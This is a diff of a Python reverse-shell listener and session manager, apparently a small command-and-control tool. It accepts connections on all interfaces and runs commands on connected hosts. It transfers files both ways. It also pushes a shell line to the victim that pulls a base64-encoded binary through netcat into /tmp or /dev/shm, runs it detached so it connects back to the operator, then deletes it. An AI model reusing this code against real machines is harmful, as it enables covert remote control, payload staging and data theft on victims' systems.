@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 
-from modules.utils import listen, send_file, chk_payload
+from modules.utils import send_file, chk_payload
 from modules.sysinfo import SystemInfoGatherer
-from modules.nethelper import netshell_loop, pretty
+from modules.nethelper import netshell_loop, pretty, listen
 from threading import Thread
 import logging
 import socket
@@ -36,7 +36,7 @@ class NetShell(cmd.Cmd):
         if not self.is_open:
             raise BrokenPipeError
         return line
-    
+
     def postcmd(self, stop, line):
         """Hook method executed just after a command dispatch is finished."""
 
@@ -55,11 +55,12 @@ class NetShell(cmd.Cmd):
             except BlockingIOError:
                 continue
             except OSError as e:
-                logging.error(f"Session {self.id +1}: BrokenPipeError")
-                self.is_open = False
-                self.server.client_socket.close()
-                self.server.server_socket.close()
-                break
+                if self.is_loop:
+                    logging.error(f"Session {self.id +1}: BrokenPipeError")
+                    self.is_open = False
+                    self.server.client_socket.close()
+                    self.server.server_socket.close()
+                    break
             except Exception:
                 logging.error("unexpected exception when checking if a socket is closed")
                 break
@@ -87,7 +88,7 @@ class NetShell(cmd.Cmd):
             else:
                 path = pretty(self.server.send_command(f"realpath {line}"))
 
-        sys.stdout.write(f"{path}\n{'=' * (len(path))}\n\n{ls}\n\n")
+        sys.stdout.write(f"{path}\n{'=' * (len(path))}\n\n{ls}\n")
     
     def do_send(self, line):
         check = self.server.send_command(f"sendingfile/{line}")
@@ -97,15 +98,20 @@ class NetShell(cmd.Cmd):
                     self.server.client_socket.send(chunk)
 
     def do_get(self, line):
-        text = pretty(self.server.send_command(f"gettingfile/{line}"))
-        if text:
+        contents = pretty(self.server.send_command(f"gettingfile/{line}"))
+        if contents:
             with open(line.split("/")[-1], 'w') as f:
-                f.write(text)
+                f.write(f"{contents}\n")
 
     def do_run(self, line):
-        self.output = self.server.send_command(line, wt_output=False)
+        self.output = pretty(self.server.send_command(line))
         if self.output:
-            sys.stdout.write(f"prettify_output(self.output)\n")
+            sys.stdout.write(f"{self.output}\n")
+
+    def do_cd(self, line): # BUG: Causes cryptography.exceptions.InvalidTag for some reason
+        self.output = pretty(self.server.send_command(f"cd {line}"))
+        if self.output:
+            sys.stdout.write(f"{self.output}\n")
 
     def do_exit(self, line):
         logging.info(f"Closing connection from session {self.id +1}")
@@ -123,12 +129,12 @@ class LocalShell(cmd.Cmd):
         self.currentSession = None
         if len(sys.argv) > 1 and sys.argv[1] == "-l":
             self.do_listen(None)
-        
+
         if not os.path.isfile(os.path.join(PROJ_DIR, "payloads/payload")):
             logging.warning('Warning: Binary file "payload" is not present.')
             chk_payload(PROJ_DIR)
 
-        
+
     def emptyline(self):
         """Called when an empty line is entered in response to the prompt.
 
@@ -149,30 +155,35 @@ class LocalShell(cmd.Cmd):
 
     def do_listen(self, line):
         if not line:
-            host, port = ("localhost", 4242)
+            host, port = ("0.0.0.0", 4242)
         else:
             host, port = line.strip().split(" ")
 
         sock = listen(host, port, 0)
+        if not sock: return
         sock.sysinfo = SystemInfoGatherer()
-        sock.sysinfo.binaryGatherer(sock)
+        # sock.sysinfo.binaryGatherer(sock)
 
-        if not sock:
-            return
-        
+
+        # TODO: Make it so that if there 
+        sock.sysinfo.is_nc = pretty(sock.send_command("which nc")) # This doesnt work
         if sock.sysinfo.is_nc:
             logging.info(f"Sending payload..")
-            sock.client_socket.send(b"touch payload\n")
-            sock.client_socket.send(b"chmod +x payload\n")
-            sock.client_socket.send(f"setsid sh -c '{sock.sysinfo.is_nc} -l 1234 | base64 -d > payload && sleep 5 && ./payload {host} {port}'\n".encode())
+
+            sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ;" \
+                                            f"setsid sh -c '{sock.sysinfo.is_nc} -lnp 1234 | base64 -d > payload ;"\
+                                            f"./payload {host} {port}'\n"\
+                                            .encode())
+
+            # TODO: add a check that confirms that netcat is running if not just skip 
             sock.server_socket.close()
             sock.client_socket.close()
             send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
             logging.info(f"Payload sent. Starting listener..")
+            
             sock = listen(host, port, 1)
-            if not sock:
-                return
-            sock.client_socket.send(b"rm -rf payload")
+            if not sock: return
+            sock.send_command("rm -rf payload")
         else:
             logging.error("Fail to sent payload. Using shell as client.")
 
@@ -182,7 +193,7 @@ class LocalShell(cmd.Cmd):
         self.currentSession.id = (len(self.sessions) - 1)
         logging.info(f"Session {self.currentSession.id + 1} created")
         netshell_loop(self.currentSession)
-    
+
     def do_sessions(self, line):
         args = line.split(" ")
         if args and "-i" in args[0]:
